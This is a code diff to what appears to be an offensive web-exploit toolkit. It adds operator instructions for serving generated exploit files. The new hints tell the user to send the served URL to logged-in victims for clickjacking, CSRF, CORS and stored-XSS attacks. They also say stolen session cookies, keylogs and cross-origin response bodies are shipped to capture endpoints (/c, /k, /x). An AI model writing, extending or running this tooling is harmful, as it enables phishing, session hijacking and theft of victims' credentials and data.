@@ -5174,17 +5174,9 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
             existing = file_mgr.get_path(fname)
             if existing:
                 serve_url = server.get_url(existing.name)
-                print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
-                ok(f"Already generated: {existing.name}")
-                ok(f"Serving at: {serve_url}")
-                if finfo.get("note"):
-                    info(finfo["note"])
-                chain_data[f"{etype}_file"] = existing.name
-                chain_data[f"{etype}_url"] = serve_url
-                chain_data["last_file"] = existing.name
-                chain_data["last_serve_url"] = serve_url
+                out_name = existing.name
+                was_new = False
             else:
-                print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
                 content = finfo.get("content", "")
                 content = content.replace("[TARGET_URL]", test_url)
                 content = _subst_attacker(content, attacker_url,
@@ -5194,15 +5186,80 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                     exploit_type=etype, content=content, custom_name=fname,
                 )
                 serve_url = server.get_url(out_path.name)
-                ok(f"Generated: {out_path.name}")
-                ok(f"Serving at: {serve_url}")
-                if finfo.get("note"):
-                    info(finfo["note"])
-                audit.log_file_generated(out_path.name, etype)
-                chain_data[f"{etype}_file"] = out_path.name
-                chain_data[f"{etype}_url"] = serve_url
-                chain_data["last_file"] = out_path.name
-                chain_data["last_serve_url"] = serve_url
+                out_name = out_path.name
+                was_new = True
+                audit.log_file_generated(out_name, etype)
+
+            # Highly visible hand-off block. Previously this just
+            # printed 'Serving at: URL' as a dim 'info' line and the
+            # operator would stare at it wondering 'what do I do
+            # with this file?'. The whole POINT of these steps is
+            # that the operator needs to manually get the serve URL
+            # in front of a VICTIM (clickjacking → iframe bait,
+            # stored_xss → phish the URL, csrf → auto-submitting
+            # form, etc.). Make that unmistakably obvious.
+            print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
+            if was_new:
+                ok(f"Generated  {out_name}")
+            else:
+                ok(f"Already generated  {out_name}")
+            print()
+            print(f"    {B}┌─ ACTION REQUIRED ─────────────────────────────────{N}")
+            print(f"    {B}│  SERVE URL:{N}  {G}{serve_url}{N}")
+            print(f"    {B}│{N}")
+            # Vuln-class-specific handoff instructions. These are the
+            # 'what do I do NEXT?' that used to be buried in the
+            # file's `note` field and easy to miss.
+            _handoff_hints = {
+                "clickjacking": [
+                    "send the SERVE URL to a logged-in victim.",
+                    "when they click the bait button, they actually",
+                    "click through to the framed target — confirm via",
+                    "the /c or /b capture that the target action fired.",
+                ],
+                "stored_xss": [
+                    "POST the marker through the injection URL (next",
+                    "step does that automatically). Then have the",
+                    "victim load the RENDER page; their session cookie",
+                    "lands in /c, keylog in /k.",
+                ],
+                "csrf": [
+                    "send the SERVE URL to a logged-in victim. The",
+                    "form auto-submits to the target using their",
+                    "cookies — success shows as a capture on /b or",
+                    "in the target's app state.",
+                ],
+                "cors": [
+                    "send the SERVE URL to a logged-in victim. Their",
+                    "browser will attempt the cross-origin fetch;",
+                    "captured response body arrives on /x.",
+                ],
+                "cookie_exfil": [
+                    "load the SERVE URL in a victim browser. Every",
+                    "document.cookie entry is shipped to /c.",
+                ],
+                "open_redirect": [
+                    "send the SERVE URL or visit it yourself to confirm",
+                    "the redirect chain. Capture appears on /b with",
+                    "the final destination in the referer.",
+                ],
+            }
+            hints = _handoff_hints.get(etype) or [
+                "serve the URL to whoever needs to load it; watch",
+                "the live capture viewer (L) for any callback.",
+            ]
+            for ln in hints:
+                print(f"    {B}│{N}  {D}{ln}{N}")
+            print(f"    {B}│{N}")
+            print(f"    {B}│{N}  {D}live viewer: return to deck → L{N}")
+            print(f"    {B}│{N}  {D}save URL to ephemeral file: deck → V{N}")
+            print(f"    {B}└───────────────────────────────────────────────────{N}")
+            if finfo.get("note"):
+                print(f"    {D}note: {_tsafe_preview(finfo['note'], 200)}{N}")
+            chain_data[f"{etype}_file"] = out_name
+            chain_data[f"{etype}_url"] = serve_url
+            chain_data["last_file"] = out_name
+            chain_data["last_serve_url"] = serve_url
             print()
             step_idx += 1
             continue
